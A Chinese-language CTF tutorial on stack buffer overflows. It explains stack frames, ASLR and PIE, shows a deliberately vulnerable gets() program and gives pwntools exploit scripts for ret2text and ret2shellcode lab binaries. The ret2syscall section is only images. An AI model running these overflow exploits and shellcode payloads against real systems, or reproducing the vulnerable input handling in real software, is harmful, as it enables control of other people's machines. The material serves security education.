# 栈溢出

Author: H3rmesk1t

# 栈介绍
## 基本栈介绍
栈是一种后进先出(LIFO)的数据结构, 只有入栈(push)和出栈(pop)两种操作. 每个程序在运行的过程中都存在虚拟地址空间, 其中某一部分就是该程序对应的栈, 用于保存函数调用信息和局部变量. 需要注意的是, 程序的栈是从进程地址空间的高地址向低地址增长的.

<div align=center><img src="./images/1.png"></div>

## 函数调用栈
在程序的运行期间, 内存中有一块用来实现程序的函数调用机制的区域, 该区域是一块`LIFO`的数据结构区域, 我们通常叫其函数栈. 每个未退出的函数都会在函数栈中拥有一块数据区, 即函数的栈帧. 函数的调用栈帧中, 保存了相应的函数的一些重要信息: 函数中使用的局部变量、函数的参数, 另外还有一些维护函数栈所需要的数据, 比如`EBP`指针(指向“父函数”的调用栈帧), 函数的返回地址等.


这里通过调试代码来理解一下, 示例代码如下:

```c++
#include <iostream>

int add(int num) {
    int temp = 2;
    return num + temp;
}

int main() {
    int num = 1;
    std::cout << add(num) << std::endl;
    return 0;
}
```

<div align=center><img src="./images/2.png"></div>

<div align=center><img src="./images/3.png"></div>

这里给出一张寄存器的图, 需要注意的是, `32`位和`64`位程序存在一定的区别:
 - x86
    - 函数参数在函数返回地址上.
 - x64: 
    - 内存地址不能大于`0x00007FFFFFFFFFFF`, `6`个字节长度,否则会抛出异常.
    - `System V AMD64 ABI`(Linux、FreeBSD、macOS等采用)中前六个整型或指针参数依次保存在`RDI`, `RSI`, `RDX`, `RCX`, `R8`和`R9`寄存器中, 如果还有更多的参数的话才会保存在栈上.

<div align=center><img src="./images/4.png"></div>

其中, 常见寄存器有:
 - 数据寄存器: EAX(累加器), EBX(基地址寄存器), ECX(计数器), EDX(用来放整数除法产生的余数)
 - 变址和指针寄存器: ESI(源索引寄存器), EDI(目标索引寄存器)
 - 指针寄存器: ESP(栈指针寄存器-其内存放着一个指针永远指向系统栈最上面一个栈帧的栈顶), EBP(基址指针寄存器-其内存放着一个指针永远指向系统栈最上面一个栈帧的底部)


# 栈溢出原理
## 介绍
栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数, 因而导致与其相邻的栈中的变量的值被改变. 这种问题是一种特定的缓冲区溢出漏洞, 类似的还有堆溢出, `bss`段溢出等溢出方式. 栈溢出漏洞轻则可以使程序崩溃, 重则可以使攻击者控制程序执行流程. 

此外, 发生栈溢出的基本前提是:
 - 程序必须向栈上写入数据.
 - 程序向栈上写入的数据大小未能被很好的控制.

## 示例
在栈溢出漏洞中, 最典型的漏洞利用方式是覆盖程序的返回地址为攻击者所控制的地址, 当然, 这个地址所在的段是必须有可执行权限的. 下面用一个简单的例子来进行说明, 示例代码如下:

```c++
#include<stdio.h>
#include<string.h>

void success() {
	puts("Successfully, you have already controlled this system!");
	system("/bin/bash");
}

void vulnerable() {
	char data[10];
	gets(data);
	puts(data);
	return;
}

int main(int argc, char **argv) {
	vulnerable();
	return 0;
}
```

上述程序的主要目的读取一个字符串并将其输出, 而我们则希望可以控制程序执行`success`函数. 编译示例代码:

```bash
gcc -m32 -fno-stack-protector -no-pie example.c -o example

explanation:
    -m32: 生成32位程序.
    -fno-stack-protector: 不开启堆栈溢出保护, 即不生成canary.
    -no-pie: 避免加载基址被打乱, 不同gcc版本对于PIE的默认配置不同, 可通过命令gcc -v来查看默认的开关情况.
```

<div align=center><img src="./images/5.png"></div>

在上面的编译结果中可以看到`gets`本身是一个危险函数(从不检查输入字符串的长度, 而是以回车来判断输入是否结束), 因此很容易导致栈溢出现象出现.

上文提到编译时的`PIE`保护, 其实在`Linux`平台下还有地址空间分布随机化(ASLR)的机制. 即使可执行文件开启了`PIE`保护, 还需要系统开启`ASLR`才会真正打乱基址, 否则程序运行时依旧会在加载一个固定的基址上(不过和No PIE时基址不同). 可以通过修改`/proc/sys/kernel/randomize_va_space`来控制`ASLR`启动与否, 具体选项为:
 1. 关闭`ASLR`. 没有随机化, 栈、堆、`.so`的基地址每次都相同.
 2. 普通的`ASLR`. 栈基地址、`mmap`基地址、`.so`加载基地址都将被随机化, 但是堆基地址没有随机化.
 3. 增强的`ASLR`. 在普通`ASLR`的基础上增加了堆基地址随机化.

根据上文的选项讲解, 可以使用`echo 0 > /proc/sys/kernel/randomize_va_space`关闭`Linux`系统的`ASLR`, 类似的也可以配置相应的参数.

编译成功后, 使用工具`checksec`来检查编译出的文件, 可以看到栈溢出和`PIE`保护都是关闭的.

<div align=center><img src="./images/6.png"></div>

利用`IDA`来反编译一下二进制程序并查看`vulnerable`函数.

<div align=center><img src="./images/7.png"></div>

在`vulnerable`函数中, 该字符串距离`ebp`的长度为`0x12`, 那么相应的栈结构为:

```text
                                        +-----------------+
                                        |     retaddr     |
                                        +-----------------+
                                        |     saved ebp   |
                                ebp--->+-----------------+
                                        |                 |
                                        |                 |
                                        |                 |
                                        |                 |
                                        |                 |
                                        |                 |
                        data,ebp-0x16-->+-----------------+
```

并且, 我们可以通过`IDA`获得`success`的地址, 其地址为`0x080491B6`.

<div align=center><img src="./images/8.png"></div>

那么如果我们读取的字符串为`0x12*'a'+'bbbb'+success_addr`, 由于`gets`会读到回车才算结束, 所以我们可以直接读取所有的字符串, 并且将`saved ebp`覆盖为`bbbb`, 将`retaddr`覆盖为`success_addr`, 此时的栈结构为:

```text
                                        +-----------------+
                                        |    0x080491B6   |
                                        +-----------------+
                                        |       bbbb      |
                                ebp--->+-----------------+
                                        |                 |
                                        |                 |
                                        |                 |
                                        |                 |
                                        |                 |
                                        |                 |
                        data,ebp-0x16-->+-----------------+
```

根据上文的分析, 即可开始构造相应的`exploit`了. 这里需要注意的一点是, 在计算机内存中每个值都是按照字节存储的. 一般情况下都是采用小端存储, 即`0x080491B6`在内存中的形式是`\xb6\x91\x04\x08`. `exploit`如下:

```python
# coding=utf-8
from pwn import *

# 构造与程序交互的对象
p = process('./example')
success_addr = 0x080491B6

# 构造Payload
# payload = 'a' * 0x16 + p32(success_addr)
payload = 'a' * 0x12 + 'bbbb' + p32(success_addr)

# 发送Payload
p.sendline(payload)

# 代码交互转为手工交互
p.interactive()
```

执行`exploit`, 可以看到成功执行到了`success`函数.

<div align=center><img src="./images/9.png"></div>

## 总结
### 寻找危险函数
通过寻找危险函数, 可以快速确定程序是否可能存在栈溢出, 以及存在的话, 栈溢出的位置在哪里. 常见的危险函数如下:
 - 输入
   - gets
   - scanf
   - vscanf
 - 输出
   - sprintf
 - 字符串
   - strcpy
   - strcat
   - bcopy

### 确定填充长度
这一部分主要是计算我们所要操作的地址与我们所要覆盖的地址的距离. 常见的操作方法就是打开`IDA`, 根据其给定的地址计算偏移.

一般来说, 变量会有以下几种索引模式:
 - 相对于栈基地址的的索引, 可以直接通过查看`EBP`相对偏移获得.
 - 相对应栈顶指针的索引, 一般需要进行调试, 之后还是会转换到第一种类型.
 - 直接地址索引, 就相当于直接给定了地址.

一般来说, 会有如下的覆盖需求:
 - 覆盖函数返回地址, 这时候就是直接看`EBP`即可.
 - 覆盖栈上某个变量的内容.
 - 覆盖`bss`段某个变量的内容.
 - 根据现实执行情况, 覆盖特定的变量或地址的内容.

# 基本ROP
随着`NX`保护的开启, 以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果. 攻击者们也提出来相应的方法来绕过保护, 目前主要的是`ROP`(Return Oriented Programming), 其主要思想是在栈缓冲区溢出的基础上, 利用程序中已有的小片段(gadgets)来改变某些寄存器或者变量的值, 从而控制程序的执行流程. 所谓`gadgets`就是以`ret`结尾的指令序列, 通过这些指令序列, 我们可以修改某些地址的内容, 方便控制程序的执行流程.

之所以称之为`ROP`, 是因为核心在于利用了指令集中的`ret`指令, 改变了指令流的执行顺序. `ROP`攻击一般得满足如下条件:
 - 程序存在溢出, 并且可以控制返回地址.
 - 可以找到满足条件的`gadgets`以及相应`gadgets`的地址.

如果`gadgets`每次的地址是不固定的, 那我们就需要想办法动态获取对应的地址了.

## ret2text
### 原理
`ret2text`即控制程序执行程序本身已有的的代码(.text). 其实这种攻击方法是一种笼统的描述, 我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码(也就是`gadgets`), 这就是我们所要说的`ROP`. 这时, 我们需要知道对应返回的代码的位置, 当然程序也可能会开启某些保护, 我们需要想办法去绕过这些保护.

### 例子
程序下载链接: [ret2text](https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text).

首先, 查看一下程序的保护机制. 可以看到这是一个`32`位程序, 并且开起了栈不可执行保护.

<div align=center><img src="./images/10.png"></div>

使用`IDA`来查看源代码, 程序在主函数中使用了`gets`函数, 显然存在栈溢出漏洞.

<div align=center><img src="./images/11.png"></div>

在`secure`函数又发现了存在调用`system("/bin/sh")`的代码. 到此, 攻击逻辑基本就清楚了, 我们直接控制程序返回至`0x0804863A`, 那么就可以得到系统的`shell`了.

<div align=center><img src="./images/12.png"></div>

下面就是确定填充长度来构造`payload`的问题了, 首先需要确定的是我们能够控制的内存的起始地址距离`main`函数的返回地址的字节数.

<div align=center><img src="./images/13.png"></div>

可以看到该字符串是通过相对于`esp`的索引, 所以我们需要进行调试, 将断点下在`call`处, 查看`esp`, `ebp`.

<div align=center><img src="./images/14.png"></div>

可以看到`esp`为`0xff805d70`, `ebp`为`0xff805df8`, 同时`s`相对于`esp`的索引为`esp+0x1c`, 因此我们可以推断:
 - `s`的地址为`0xff805d8c`
 - `s`相对于`ebp`的偏移为`0xff805df8-0xff805d8c`, 即`0x6c`.

`exploit`如下:

```python
# coding=utf-8
from pwn import *

sh = process('./ret2text')
shell_addr = 0x0804863A
payload = 'a' * (0x6c+4) + p32(shell_addr)
sh.sendline(payload)
sh.interactive()
```

<div align=center><img src="./images/15.png"></div>

## ret2shellcode
### 原理
`ret2shellcode`即控制程序执行`shellcode`代码. `shellcode`指的是用于完成某个功能的汇编代码, 常见的功能主要是获取目标系统的`shell`. 一般来说, `shellcode`需要我们自己填充. 这其实是另外一种典型的利用方法, 此时我们需要自己去填充一些可执行的代码.

在栈溢出的基础上, 要想执行`shellcode`, 需要对应的`binary`在运行时, `shellcode`所在的区域具有可执行权限.

### 例子
程序下载链接: [ret2shellcode](https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode).

首先, 查看一下程序的保护机制. 可以看到这是一个`32`位程序, 源程序几乎没有开启任何保护, 并且有可读, 可写, 可执行段.

<div align=center><img src="./images/16.png"></div>

使用`IDA`来查看源代码, 程序仍然是基本的栈溢出漏洞, 不过这次还同时将对应的字符串复制到`buf2`处, 简单查看可知`buf2`在`bss`段.

<div align=center><img src="./images/17.png"></div>

<div align=center><img src="./images/18.png"></div>

这时, 我们简单的调试下程序, 看看这一个`bss`段是否可执行. 通过`vmmap`, 我们可以看到`bss`段对应的段具有可执行权限.

<div align=center><img src="./images/19.png"></div>

那么这次我们就控制程序执行`shellcode`, 也就是读入`shellcode`, 然后控制程序执行`bss`段处的`shellcode`.

<div align=center><img src="./images/20.png"></div>

`exploit`如下:

```python
#!/usr/bin/env python
from pwn import *

sh = process('./ret2shellcode')
shellcode = asm(shellcraft.sh())
buf2_addr = 0x804a080

sh.sendline(shellcode.ljust(112, 'A') + p32(buf2_addr))
sh.interactive()
```

## ret2syscall

<div align=center><img src="./images/21.png"></div>



<div align=center><img src="./images/22.png"></div>
<div align=center><img src="./images/23.png"></div>
<div align=center><img src="./images/24.png"></div>
<div align=center><img src="./images/25.png"></div>
<div align=center><img src="./images/26.png"></div>
<div align=center><img src="./images/27.png"></div>
<div align=center><img src="./images/28.png"></div>
<div align=center><img src="./images/29.png"></div>
<div align=center><img src="./images/30.png"></div>
<div align=center><img src="./images/31.png"></div>
<div align=center><img src="./images/32.png"></div>
<div align=center><img src="./images/33.png"></div>
<div align=center><img src="./images/34.png"></div>
<div align=center><img src="./images/35.png"></div>
<div align=center><img src="./images/36.png"></div>
<div align=center><img src="./images/37.png"></div>
<div align=center><img src="./images/38.png"></div>
<div align=center><img src="./images/39.png"></div>
<div align=center><img src="./images/40.png"></div>
<div align=center><img src="./images/41.png"></div>
<div align=center><img src="./images/42.png"></div>
<div align=center><img src="./images/43.png"></div>
<div align=center><img src="./images/44.png"></div>
<div align=center><img src="./images/45.png"></div>
<div align=center><img src="./images/46.png"></div>
<div align=center><img src="./images/47.png"></div>
<div align=center><img src="./images/48.png"></div>
<div align=center><img src="./images/49.png"></div>